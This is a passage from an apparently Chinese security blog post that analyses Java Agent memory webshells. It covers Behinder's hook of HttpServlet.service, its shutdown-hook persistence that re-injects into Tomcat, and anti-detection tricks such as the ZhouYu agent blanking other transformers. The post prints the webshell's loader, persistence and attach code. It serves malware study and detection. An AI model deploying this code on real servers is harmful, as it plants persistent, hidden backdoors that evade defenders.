class="line"><span class="string">			java.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]&#123;null,java.nio.ByteBuffer.wrap(buf),null&#125;);</span></span><br><span class="line"><span class="string">			c.newInstance().equals(obj);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		catch(java.lang.Exception e)</span></span><br><span class="line"><span class="string">		&#123;</span></span><br><span class="line"><span class="string">		   e.printStackTrace();</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		catch(java.lang.Error error)</span></span><br><span class="line"><span class="string">		&#123;</span></span><br><span class="line"><span class="string">		error.printStackTrace();</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		return;</span></span><br><span class="line"><span class="string">	&#125;	</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​    通过上面的分析，我们可以知道其实冰蝎的Agent内存马实现是修改了<code>HttpServlet.service</code>方法，<code>HttpServlet</code>是所有<code>Servlet</code>的直接或者间接的父类，在<code>internalDoFilter.doFilter</code>中会调用<code>HttpServlet.service</code>,再由这个方法转到其他<code>Servlet</code>的<code>service</code>方法中完成处理。</p>
<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>​    冰蝎的持久化部分在<code>persist</code>函数中实现，首先通过<code>readInjectFile</code>和<code>readAgentFile</code>将<code>inject.jar</code>和<code>agent.jar</code>读取到内存，在<code>persist</code>函数中写入到文件并通过<code>startInject</code>执行<code>Inject.jar</code>。这里的<code>addShutdownHook</code>是一个钩子，Hook了JVM关闭的事件，也就是说当JVM关闭时，会调用<code>Run</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           initLoad();</span><br><span class="line">           readInjectFile(currentPath);</span><br><span class="line">           readAgentFile(currentPath);</span><br><span class="line">           clear(currentPath);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       persist();</span><br><span class="line">   &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">persist</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Thread t = <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">               <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       Agent.writeFiles(<span class="string">&quot;inject.jar&quot;</span>, Agent.injectFileBytes);</span><br><span class="line">                       Agent.writeFiles(<span class="string">&quot;agent.jar&quot;</span>, Agent.agentFileBytes);</span><br><span class="line">                       Agent.startInject();</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">               &#125;</span><br><span class="line">           &#125;;</span><br><span class="line">           t.setName(<span class="string">&quot;shutdown Thread&quot;</span>);</span><br><span class="line">           Runtime.getRuntime().addShutdownHook(t);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Throwable var1) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>startInject</code>方法比较简单，通过命令执行<code>Inject.jar</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">startInject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000L</span>);</span><br><span class="line">        String tempFolder = System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;java -jar &quot;</span> + tempFolder + File.separator + <span class="string">&quot;inject.jar &quot;</span> + password;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>Inject.jar</code>则创建一个<code>while</code>循环，检测运行的JVM虚拟机是否为<code>Tomcat</code>，如果是则执行<code>Attach</code>和<code>loadAgent</code>完成运行时的注入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length != <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Usage:java -jar inject.jar password&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           ...</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        vmList = VirtualMachine.list();</span><br><span class="line">                        <span class="keyword">if</span> (vmList.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            Iterator var8 = vmList.iterator();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">while</span>(var8.hasNext()) &#123;</span><br><span class="line">                                VirtualMachineDescriptor vmd = (VirtualMachineDescriptor)var8.next();</span><br><span class="line">                                <span class="keyword">if</span> (vmd.displayName().indexOf(<span class="string">&quot;catalina&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                    vm = VirtualMachine.attach(vmd);</span><br><span class="line">                                    System.out.println(<span class="string">&quot;[+]OK.i find a jvm.&quot;</span>);</span><br><span class="line">                                    Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line">                                    <span class="keyword">if</span> (vm != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                        vm.loadAgent(agentFile, agentArgs);</span><br><span class="line">                                        System.out.println(<span class="string">&quot;[+]memeShell is injected.&quot;</span>);</span><br><span class="line">                                        vm.detach();</span><br><span class="line">                                        <span class="keyword">return</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">      ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    通过分析实现我们不难看出，这种方法的实现是在关闭JVM是将<code>Agent</code>的代码写入到文件，并重新开启一个JAVA进程，<strong>如果在关闭Tomcat后结束了所有的JAVA进程比如说系统重启，那么这种方式的持久化显然就不行了。</strong></p>
<h2 id="防检测"><a href="#防检测" class="headerlink" title="防检测"></a>防检测</h2><p>​    <code>rebeyond</code>师傅在<code>Java内存攻击技术漫谈</code>中给出了在<code>Windows</code>和<code>Linux</code>平台下防止Attach的方法，<code>Windows</code>下将<code>_JVM_EnqueueOperation@20</code>和<code>JVM_EnqueueOperation</code> NOP实现，由于我缺乏这方面的知识背景就不分析了。<code>Linux</code>下通过删除<code>UNIX Domain Socket</code>文件实现。</p>
<p>​    <code>ZhouYu</code> Agent内存马也实现了防检测的技术，主要通过检测被加载的类是否实现<code>ClassFileTransformer</code>接口，如果是则将该类的实现改为空。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">check0</span><span class="params">(String className, CtClass ctClass)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">       CtClass[] interfaces = ctClass.getInterfaces();</span><br><span class="line">       <span class="keyword">if</span> (interfaces != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">           <span class="keyword">for</span> (CtClass anInterface : interfaces) &#123;</span><br><span class="line">               <span class="comment">//遇到其它的agent，直接干掉它，不让它加载</span></span><br><span class="line">               <span class="keyword">if</span> (anInterface.getName().equals(<span class="string">&quot;java.lang.instrument.ClassFileTransformer&quot;</span>)) &#123;</span><br><span class="line">                   System.out.println(String.format(<span class="string">&quot;[ZhouYu] 有新的agent: %s 加载，把它干掉！&quot;</span>, className));</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               flag |= check0(className, anInterface);</span><br><span class="line">               <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                   <span class="keyword">return</span> flag;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] check(String className, ClassLoader loader, <span class="keyword">byte</span>[] codeBytes) &#123;</span><br><span class="line">       CtClass ctClass = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">           classPool.appendClassPath(<span class="keyword">new</span> LoaderClassPath(loader));</span><br><span class="line">           ctClass = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(codeBytes));</span><br><span class="line">           <span class="comment">//check0返回true则将实现类修改为空</span></span><br><span class="line">           <span class="keyword">if</span> (check0(className, ctClass)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (ctClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">               ctClass.detach();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> codeBytes;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    这篇文章主要是学习<code>Agent</code>及Agent内存马的实现记录，似乎如果真的在种植了Agent内存马并反检测后无法<code>Attach</code>上去检测，只有在<code>Agent</code>内存马打上去之前<code>Attach</code>才可以，这些对于那些云厂商来说应该是可以实现的，但是对普通的服务器来说一般不会在启动时就先启动<code>java Agent</code>检测。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10075#toc-2">Java内存攻击技术漫谈</a></li>
<li><a target="_blank" rel="noopener" href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Ajavaagent/">Java内存shell：javaagent</a></li>
<li><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/331778.html">基于javaAgent内存马检测查杀指南</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rebeyond/p/9686213.html">【原创】利用“进程注入”实现无文件不死webshell</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14086165.html">Java 安全之Java Agent</a></li>
</ul>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/内存马/">内存马</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>